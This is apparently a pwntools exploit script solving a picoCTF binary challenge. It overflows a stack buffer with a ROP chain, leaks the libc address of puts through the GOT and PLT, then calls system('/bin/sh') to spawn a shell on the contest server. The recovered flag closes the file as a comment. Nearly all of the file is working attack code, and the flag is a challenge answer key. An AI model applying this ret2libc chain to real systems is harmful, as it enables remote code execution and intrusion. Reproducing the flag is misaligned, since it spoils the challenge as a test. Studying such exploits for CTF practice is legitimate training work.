from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x0000000000400770
continue
'''.format(**locals())

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("./libc.so.6", checksec=False)

pop_rdi_ret = 0x0000000000400913
pop_rsi_pop_r15_ret = 0x0000000000400911
ret = 0x000000000040052e


# p = start()
p = remote("mercury.picoctf.net", 24159)
p.recvline()

payload = flat(
    cyclic(0x88),
    pop_rdi_ret,
    elf.got.puts,
    elf.plt.puts,
    elf.entrypoint
)
p.sendline(payload); p.recvline()
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info("leak: " + hex(leak))
libc.address = leak - libc.sym[b'puts']

payload = flat(
    cyclic(0x88),
    ret,
    pop_rdi_ret,
    next(libc.search(b"/bin/sh")),
    libc.sym[b"system"]
)

p.sendline(payload)
p.interactive()

# picoCTF{1_<3_sm4sh_st4cking_cf205091ad15ab6d}